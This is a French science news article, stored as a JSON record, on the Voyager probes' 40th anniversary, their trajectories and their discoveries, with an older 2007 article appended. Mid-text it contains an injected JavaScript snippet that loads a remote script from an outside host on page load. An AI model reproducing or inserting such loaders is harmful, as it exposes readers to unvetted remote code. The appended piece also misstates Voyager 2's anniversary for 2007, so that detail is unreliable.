{"title": "Les sondes Voyager 1 et 2 fêtent leurs 40 ans loin de l'humanité", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "20/08/2017", "content": "Cela fait 40 ans que la sonde Voyager 1 a quitté la Terre. C'était un peu plus de deux semaines après sa jumelle Voyager 2. Alors que la première vogue dans l'espace interstellaire depuis déjà quelques années, la seconde ne devrait plus tarder à franchir cette porte. Les deux engins spatiaux, les plus éloignés de l'humanité, ont permis de grandes découvertes qui ont redessiné le Système solaire et les planètes géantes visitées. Emportant avec eux des témoignages de la vie sur la Planète bleue, Voyager 1 et 2 sont des traces de l'humanité fonçant dans la Galaxie. Un voyage sans fin. Ce qu'il faut retenir Le 5 septembre, la sonde Voyager 1 fête le 40 e  anniversaire de son lancement. C’était le 20 août pour Voyager 2. Voyager 1 a franchi l’héliosphère en 2012 et vogue désormais à quelque 61.000 km/h dans le milieu interstellaire. Dans 40.000 ans, elle passera près d’une petite étoile de la constellation de Girafe. Dans 225 millions d’années, elle aura bouclé son premier tour de la Galaxie. Voyager 1 et 2 ont changé notre perception du Système solaire et de ses quatre planètes géantes. Jamais engins spatiaux construits par l'Homme n'ont été si éloignés de son berceau — un point bleu pâle ( pale blue dot ) dans l'océan interplanétaire —, la  Terre . Ce 5 septembre 2017, la sonde Voyager 1 fête les 40 ans de son lancement du Centre spatial Kennedy en Floride. Un peu plus tôt, le 20 août dernier, c'était son jumeau  Voyager 2  qui célébrait aussi le 40 e  anniversaire de son départ. Depuis, que de chemin parcouru à travers le  Système solaire  et au-delà... Et bien sûr, que de découvertes ! L'impact de ces deux pionnières de l'exploration spatiale, de constructions robustes et partiellement toujours en fonctionnement, est considérable. Sur le plan scientifique bien sûr — elles ont élargi nos horizons et nos connaissances sur les quatre planètes géantes et leurs satellites — et aussi par l'expérience de leur navigation. En effet, elles n'ont cessé d'insuffler les missions des décennies suivantes comme par exemple  Cassini , autour de  Saturne , ou encore plus récemment Juno, autour de  Jupiter .  Voir aussi : En vidéo : quand la Terre envoyait un message aux extraterrestres Enfin, il ne faut pas oublier que les deux sondes ont aussi une résonance culturelle, ayant inspiré nombre de cinéastes, écrivains, musiciens et artistes depuis 40 ans... Voyager 1 et 2 ont laissé leurs empreintes sur l'humanité, et sont aussi une trace d'elle laissée dans l'univers — elles renferment des enregistrements vidéos et sonores des habitants de la Planète et de toute sa biosphère qui voyage pour l'éternité (ou presque) dans la Galaxie... Des  « capsules de temps circulaires qui pourraient un jour être les seules traces de la civilisation humaine » , écrit la Nasa. Une touche vintage et disco pour cette affiche fêtant le 40 e  anniversaire du lancement de Voyager 1 et 2. © Nasa, JPL-Caltech                       Où va Voyager 1 ? En quatre décennies, Voyager 1 a arpenté 20,8 milliards de kilomètres, à une vitesse moyenne de 17 km/s (plus de 61.000 km/h) par rapport au  Soleil  dont elle s'éloigne en direction de Gliese 445 (17,6 années-lumière du Soleil), une petite  étoile  de la  constellation  de la  Girafe . La sonde passera dans la banlieue de la naine rouge, à 1,7 année-lumière, dans quelque 40.000 ans, sans s'arrêter. La route se poursuivra pour elle et sa jumelle qui, elle, vogue dans une autre direction, quasiment pour toujours..., à moins qu'elle ne soit un jour interceptée, voire détruite par un éventuel obstacle dans un système lointain. Autrement, la sonde aura bouclé son premier tour de la Voie lactée dans 225 millions d'années ! Mais serons-nous encore là pour la récupérer ?  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Le son interstellaire enregistré par Voyager-1 En août 2012, Voyager 1 est officiellement devenu le premier vaisseau d'origine terrestre à pénétrer dans l'espace interstellaire. Est-elle pour autant sortie du  Système solaire  ? Si l'on considère que celui-ci comprend tous les corps soumis à l'attraction gravitationnelle du Soleil, la réponse est non. Il y a encore beaucoup de route à faire : actuellement, Voyager 1 n'est qu'à 140 unités astronomiques. Cette distance peut paraître grande mais elle ne représente que 19 heures et 21 minutes-lumière... Pour autant, le vaisseau rencontre depuis cinq ans un environnement cosmique différent de celui dans lequel baignent les planètes qu'il a visitées. Tout indique en effet qu'il est sorti de l' héliosphère , la bulle de vent solaire qui enveloppe le Soleil, et navigue désormais dans la bulle locale, un milieu où il est confronté à quatre fois plus de rayons cosmiques. Costaude, construite pour résister au puissant  champ magnétique  de  Jupiter , la sonde est plutôt bien protégeé. Ses concepteurs sont confiants. On peut imaginer l'excitation des chercheurs qui obtenaient pour la première fois des informations directes sur ce milieu. C'est comme se retrouver tout à coup face à l'océan et pouvoir en tâter l'eau. De son côté, son frère Voyager 2 vogue vers le sud du plan des orbites des planètes autour du Soleil Actuellement à 17,2 milliards de kilomètres, il n'est pas encore entré dans le milieu interstellaire. Mais cela ne saurait tarder. C'est une question d'années. Presque toutes les planètes du Système solaire figurent sur cette vue d’ensemble, la première jamais réalisée. Les images qui composent ce « portrait de famille du Système solaire » ont été prises par Voyager 1 le 14 février 1990 à plus de 6,4 milliards de kilomètres de la Terre. Notre planète a alors été surnommée par Carl Sagan  pale blue dot , et c’est en effet, vue d’aussi loin, un petit point mesurant 0,12 pixel. Plusieurs d’entre nous étaient sur cette photo quand elle a été prise, l’une des plus célèbres de la mission et aussi la dernière. © Nasa, JPL-Caltech                               Les principales découvertes de Voyager 1 et 2 Voyager 1 et 2 ont littéralement changé notre compréhension du Système solaire. La première a eu l'occasion de visiter les deux plus grandes planètes, Jupiter et Saturne, et la seconde, les quatre géantes. Un grand tour qui a permis à l'humanité de faire de grandes découvertes et d'ouvrir ses yeux pour la première fois sur des mondes très différents les uns des autres. La mission Voyager nous a ainsi dévoilé les  volcans actifs de Io , ce qui était inédit à l'époque, fourni les premiers indices de l'existence possible d'un océan d'eau liquide sur Europe, autre lune de Jupiter, montré l'étonnante atmosphère de Titan, présenté les lunes d' Uranus  et aussi les geysers de Triton, lune de  Neptune . Et bien d'autres découvertes encore, sans oublier celles sur le milieu interstellaire et celles qui sont à venir. Voir aussi : Uranus : quelle sera la prochaine mission, 30 ans après Voyager 2 ? « Aucun d'entre nous ne savait, quand nous avons lancé il y a 40 ans, que tout fonctionnerait encore et que nous poursuivrions ce voyage pionnier , raconte Ed Stone, chercheur de la mission à Caltech (Pasadena, en Californie).  La chose la plus excitante qu'ils trouveront au cours des cinq prochaines années pourrait être quelque chose que nous n'attendons pas » . L'aventure continue... et ce n'est qu'un début ! Voyager 1 et 2 sur Futura : Anniversaire des Voyager : le disque d’or pour extraterrestres a 35 ans Voyager 1 voguerait bien dans l’espace interstellaire Les sondes Voyager résolvent une énigme de notre banlieue interstellaire Les vieilles sondes Voyager révèlent les raies Lyman alpha de la Voie lactée En vidéo : les images de la sonde Voyager font toujours rêver Sondes spatiales hors du Système solaire : combien y en a-t-il ? Où sont Voyager 1 et 2 maintenant ? À voir ou revoir jusqu'au 27 octobre, le documentaire diffusé sur Arte  «  Sonde Voyager : en route vers l’infini  » . Pour en savoir plus La sonde Voyager 2 fonce vers l'infini depuis 40 ans Article de Jean Etienne publié le 21 août 2007 Alors que la sonde Cassini achève sa mission autour de Saturne, le dernier visiteur de la planète aux anneaux, Voyager 2, qui n'avait fait que la frôler à 161.000 km, le 25 août 1981, fête son quarantième anniversaire dans l'espace. Elle est aujourd'hui à 17 milliards de kilomètres de la Terre, juste un peu moins loin que sa sœur Voyager 1 (20 milliards de kilomètres), l'objet fait de main d'Homme le plus éloigné de la Terre. Dans 296.000 ans, Voyager 2 arrivera dans la banlieue de Sirius... Partie le 20 août 1977 puis suivie de sa jumelle Voyager 1 lancée 16 jours plus tard depuis  Cap Canaveral , la sonde de 800  kg  devait initialement suivre un programme d'étude de cinq années en passant à proximité des planètes Jupiter (9 juillet 1979) et Saturne (12 novembre 1980). Mais à cette phase de la mission, les techniciens de la Nasa et du JPL ( Jet Propulsion Laboratory ) estimèrent que l'engin, en parfait état, pourrait jouer les prolongations en allant visiter  Uranus , et éventuellement Neptune. Le 24 janvier 1986, Voyager 2 arrivait au terme de ce grand bond et abordait Uranus, que sa caméra mitraillait pour la première fois tandis que ses instruments révélaient des détails jusque-là inconnus sur la  physique  du globe de la  planète gazeuse , de ses anneaux, de ses satellites et de son champ magnétique. La sonde récidivait le 25 août 1989 en croisant la planète Neptune, puis  prenait la direction de l'espace interstellaire . Directions prises par les deux sondes Voyager. © Nasa, JPL                               Mais alors que leur mission aurait dû être terminée depuis plusieurs années, certains chercheurs estiment aujourd'hui qu'elle ne faisait que commencer... Car un nouvel objectif se profilait, l'exploration de l'espace situé en dehors de l'héliosphère. Cette limite située à 14,1 milliards de kilomètres du Soleil, où les  vents solaires  ralentissent pour s'engouffrer dans l'espace interstellaire en créant des zones de  turbulence ,  a été atteinte en décembre 2004 par Voyager 1  tandis que Voyager 2 l'abordera à la fin de cette année. Chacun des vaisseaux est équipé de plusieurs instruments qui étudient le vent solaire et sa composition, les particules énergétiques, les champs magnétiques et les ondes  radio . L'impossibilité d'utiliser l' énergie  solaire à une telle distance, depuis laquelle notre  astre  du jour n'apparaît plus que comme une étoile un peu plus brillante que les autres, a contraint les concepteurs des engins à les munir de  générateurs  radio isotopiques qui assurent une alimentation continue de 300  watts . Ils communiquent avec la Terre par l'intermédiaire du réseau  Deep Space Network  (DSN) réparti sur toute la surface du globe. Les signaux radio émis actuellement par Voyager à une distance de 12,6 milliards de kilomètres atteignent notre planète après avoir traversé le cosmos durant 12 heures à la  vitesse de la lumière , qui est de 300.000 km/seconde. Pour Voyager 1, qui se trouve à 15,6 milliards de kilomètres, cette  durée  est portée à 14 heures. Il s'écoule donc, dans ce cas, 28 heures entre l'envoi d'un signal et la confirmation de sa bonne réception. Chacun des deux engins comporte, fixé sur ses flancs, un disque de  cuivre  plaqué or qui contient des enregistrements sonores divers, ainsi que 116 images représentant divers paysages terrestres ainsi que des planches anatomiques et des schémas simples. Chaque disque est accompagné d'une aiguille et d'une cellule pour le lire, ainsi que d'un mode d'emploi. Le disque de Voyager 2. © Nasa, JPL                               Voyager 1 et 2 continuent de s'éloigner de notre Système solaire, dans des directions différentes, à 17 kilomètres par seconde. Les ingénieurs de l'agence américaine estiment que leurs réserves d'énergie devraient leur permettre de garder le contact avec la Terre au moins jusqu'en 2020, alors que les deux sondes seront éloignées de 20 et 16,8 milliards de kilomètres. Continuant ensuite sur sa lancée, Voyager 1 devrait croiser l'étoile AC+79 3888 dans la constellation de la Girafe dans 40.000 ans, tandis que Voyager 2 prendrait le cap de Sirius, la plus brillante des étoiles de notre voûte céleste qu'elle atteindra dans 296.000 ans. Mais bien avant de se taire, gageons que les deux vaisseaux que la Nasa n'hésite pas à qualifier de légendaires  auront encore enrichi nos connaissance sur un espace interstellaire  que nous ne visiterons plus de sitôt. Enfin, sous forme de petite digression semi-scientifique : le premier vaisseau spatial que rencontrera Voyager 1 ou 2 sera-t-il terrestre ou extraterrestre ? ", "theme": "sciences"}